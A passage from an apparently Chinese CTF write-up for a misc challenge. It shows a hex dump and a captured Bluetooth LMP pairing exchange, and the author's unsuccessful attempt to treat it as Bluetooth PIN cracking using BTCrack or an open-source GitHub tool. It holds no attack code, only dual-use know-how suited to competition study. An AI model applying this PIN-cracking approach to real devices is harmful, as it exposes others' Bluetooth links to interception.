class="number">06</span> b4 <span class="number">59</span> c8 <span class="number">0</span>e a7</div><div class="line"><span class="number">78</span> <span class="number">16</span> eb c4 <span class="number">0</span>c <span class="number">19</span> <span class="number">13</span> e9 cd ff <span class="number">0</span>c af</div><div class="line">a4 ae <span class="number">80</span> <span class="number">52</span> <span class="number">31</span> <span class="number">30</span> c9 <span class="number">45</span> <span class="number">81</span> f9 f2 b9 <span class="number">69</span> fc </div><div class="line"><span class="number">4</span>b <span class="number">57</span> <span class="number">50</span> <span class="number">03</span> a0 fe <span class="number">92</span> <span class="number">0</span>f <span class="number">5</span>c c2 <span class="number">8</span>a <span class="number">7</span>b <span class="number">61</span> <span class="number">65</span></div><div class="line"><span class="number">46</span> ec <span class="number">36</span> <span class="number">66</span> <span class="number">09</span> <span class="number">6</span>b c0 f3 <span class="number">6</span>f <span class="number">0</span>a <span class="number">85</span> fa <span class="number">84</span> <span class="number">88</span> </div><div class="line">f2 <span class="number">8</span>b <span class="number">06</span> <span class="number">26</span> ae <span class="number">54</span> <span class="number">7</span>c <span class="number">47</span> d3 <span class="number">9</span>f <span class="number">06</span> b4 <span class="number">59</span> c8 </div><div class="line"><span class="number">96</span> f2 da <span class="number">3</span>e <span class="number">78</span> <span class="number">16</span> eb c4 <span class="number">0</span>c <span class="number">19</span> <span class="number">13</span> e9 cd ff </div><div class="line">a4 ae <span class="number">80</span> <span class="number">52</span> <span class="number">31</span> <span class="number">30</span> c9 <span class="number">45</span> <span class="number">81</span> f9 f2 b9 <span class="number">69</span> fc <span class="number">09</span> d8</div><div class="line"><span class="number">4</span>b <span class="number">57</span> <span class="number">50</span> <span class="number">03</span> a0 fe <span class="number">92</span> <span class="number">0</span>f <span class="number">5</span>c c2 <span class="number">8</span>a <span class="number">7</span>b <span class="number">61</span> <span class="number">65</span> de <span class="number">52</span></div><div class="line"><span class="number">46</span> ec <span class="number">36</span> <span class="number">66</span> <span class="number">09</span> <span class="number">6</span>b c0 f3 <span class="number">6</span>f <span class="number">0</span>a <span class="number">85</span> fa <span class="number">84</span> <span class="number">88</span> dc <span class="number">22</span></div><div class="line">f2 <span class="number">8</span>b <span class="number">06</span> <span class="number">26</span> ae <span class="number">54</span> <span class="number">7</span>c <span class="number">47</span> d3 <span class="number">9</span>f <span class="number">06</span> b4 <span class="number">59</span> c8 <span class="number">0</span>e a7</div><div class="line"><span class="number">96</span> f2 da <span class="number">3</span>e <span class="number">78</span> <span class="number">16</span> eb c4 <span class="number">0</span>c <span class="number">19</span> <span class="number">13</span> e9 cd ff <span class="number">0</span>c af</div></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">Protocol,LMP,XiAn,</div><div class="line">Index,Slave/Master,Type,Description,Payload Data</div><div class="line">5,Master,DM1,LMP_version_req,4A<span class="number"> 02 </span>0A<span class="number"> 00 </span>DB 04</div><div class="line">12,Slave,DM1,LMP_version_res,4C<span class="number"> 01 </span>01<span class="number"> 00 </span>2C 02</div><div class="line">19,Master,DM1,LMP_features_req,4E BF FE 0F<span class="number"> 00 </span>18<span class="number"> 18 </span>00 00</div><div class="line">26,Slave,DM1,LMP_features_res,50 BF<span class="number"> 28 </span>21<span class="number"> 00 </span>00<span class="number"> 00 </span>00 00</div><div class="line">33,Master,DM1,LMP_host_connection_req,66</div><div class="line">62,Slave,DM1,LMP_accepted : LMP_host_connection_req,06 33</div><div class="line">66,Slave,DM1,LMP_setup_complete,63</div><div class="line">69,Master,DM1,LMP_setup_complete,62</div><div class="line">73,Master,DM1,LMP_max_slot : 5,5A 05</div><div class="line">75,Master,DM1,LMP_max_slot_req : 5,5C 05</div><div class="line">120,Slave,DM1,LMP_accepted : LMP_max_slot_req,06 2E</div><div class="line">127,Master,DM1,LMP_clkoffset_req,0A</div><div class="line">134,Slave,DM1,LMP_clkoffset_res : 17542(0x4486),0C<span class="number"> 86 </span>44</div><div class="line">137,Master,DM1,LMP_name_req,02 00</div><div class="line">146,Slave,DM1,LMP_name_res : Nophretete,04<span class="number"> 00 </span>0A 4E 6F<span class="number"> 70 </span>68<span class="number"> 72 </span>65<span class="number"> 74 </span>65<span class="number"> 74 </span>65<span class="number"> 00 </span>00<span class="number"> 00 </span>00</div><div class="line">152,Slave,DM1,LMP_name_res : Nophretete,04<span class="number"> 00 </span>0A 4E 6F<span class="number"> 70 </span>68<span class="number"> 72 </span>65<span class="number"> 74 </span>65<span class="number"> 74 </span>65<span class="number"> 00 </span>00<span class="number"> 00 </span>00</div><div class="line">153,Master,DM1,LMP_features_req,4E BF FE 0F<span class="number"> 00 </span>18<span class="number"> 18 </span>00 00</div><div class="line">160,Slave,DM1,LMP_features_res,50 BF<span class="number"> 28 </span>21<span class="number"> 00 </span>00<span class="number"> 00 </span>00 00</div><div class="line">187,Master,DM1,LMP_version_req,4A<span class="number"> 02 </span>0A<span class="number"> 00 </span>DB 04</div><div class="line">194,Slave,DM1,LMP_version_res,4C<span class="number"> 01 </span>01<span class="number"> 00 </span>2C 02</div><div class="line">5933,Master,DM1,LMP_in_rand,10 EC<span class="number"> 50 </span>3F<span class="number"> 96 </span>EF<span class="number"> 26 </span>97 7E 4E DE<span class="number"> 35 </span>10 9D 6A<span class="number"> 91 </span>68</div><div class="line">6004,Slave,DM1,LMP_name_req,03 00</div><div class="line">6011,Master,DM1,LMP_name_res : Audit,05<span class="number"> 00 </span>05<span class="number"> 41 </span>75<span class="number"> 64 </span>69<span class="number"> 74 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00</div><div class="line">13536,Slave,DM1,LMP_accepted : LMP_in_rand,06 08</div><div class="line">13561,Master,DM1,LMP_comb_key,12<span class="number"> 76 </span>4F DA<span class="number"> 77 </span>B7 EE<span class="number"> 88 </span>9A 6C<span class="number"> 11 </span>D0 CA<span class="number"> 08 </span>83<span class="number"> 73 </span>CD</div><div class="line">13568,Slave,DM1,LMP_comb_key,12 FF<span class="number"> 80 </span>DF E2 CD<span class="number"> 72 </span>83<span class="number"> 76 </span>83 A4 9C C9 A7 E1 C3 BB</div><div class="line">13601,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13603,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13605,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13607,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13609,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13611,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13613,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13615,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13617,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13619,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13621,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13623,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13625,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13627,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13629,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13631,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13633,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13635,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13637,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13639,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13641,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13643,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13645,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13647,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13649,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13651,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13653,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13655,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13657,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13659,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13661,Master,DM1,LMP_au_rand,16<span class="number"> 97 </span>30 ED DB FD<span class="number"> 30 </span>1B B8 CE 1A<span class="number"> 20 </span>A8 C3 D2<span class="number"> 79 </span>D1</div><div class="line">13772,Slave,DM1,LMP_sres,18<span class="number"> 10 </span>D5 C0 DC</div><div class="line">13878,Slave,DM1,LMP_au_rand,16 1C 2B D8 3F<span class="number"> 15 </span>7A<span class="number"> 49 </span>58 B4 F8 ED 3F 6D F1<span class="number"> 62 </span>20</div><div class="line">13897,Master,DM1,LMP_sres,18<span class="number"> 26 </span>06 6D 00</div><div class="line">14261,Master,DM1,LMP_clkoffset_req,0A</div><div class="line">14268,Slave,DM1,LMP_clkoffset_res : 17542(0x4486),0C<span class="number"> 86 </span>44</div><div class="line">22078,Slave,DM1,LMP_detach : Reason - Remote User Terminated Connection,0F 13</div></pre></td></tr></table></figure>
<p>搜索关键字得到信息可能是蓝牙PIN码破解<br><img src="/images/cstc2017/misc1001.png" alt=""><br>在《无线网络安全攻防实战进阶》一书中有讲到过使用工具BTCrack来破解蓝牙PIN码<br><img src="/images/cstc2017/misc1002.png" alt=""><br><img src="/images/cstc2017/misc1003.png" alt=""><br>但时间原因，实在是找不到这个工具了，最后使用了github上一个开源的工具，测试时发现简短的PIN码是秒出的<br><img src="/images/cstc2017/misc1004.png" alt=""><br>但这题目中的第一个附件一知不知道干嘛的，于是从中挑出了符合mac地址的数据做为master addr和slave addr进行破解。。但跑了一百年都没结果。。。好惆怅啊</p>

      
    </div>

    
  </article>


          </div>
          
  <div class="comments" id="comments">
    
      <div class="ds-thread" data-thread-key="2017/04/16/cstc2017/"
           data-title="cstc2017 wp" data-url="http://weeklyalgo.codes/2017/04/16/cstc2017/">
      </div>
    
  </div>

        </div>  
      </main>

      <footer id="footer" class="footer">
  <div class="social-links">
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/weeklyalgo4groups" class="iconfont icon-github" title="github"></a>
        
      
    
      
    
      
    
    
    
  </div>


<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
    
    2017

    <span class="author">weeklyalgo.codes</span>
  </span>
</div>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"weeklyalgo"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.id = 'duoshuo-script';
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>



    
  





  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  

    <script type="text/javascript" src="/js/src/even.js?v=2.1.0"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=2.1.0"></script>

  </body>
</html>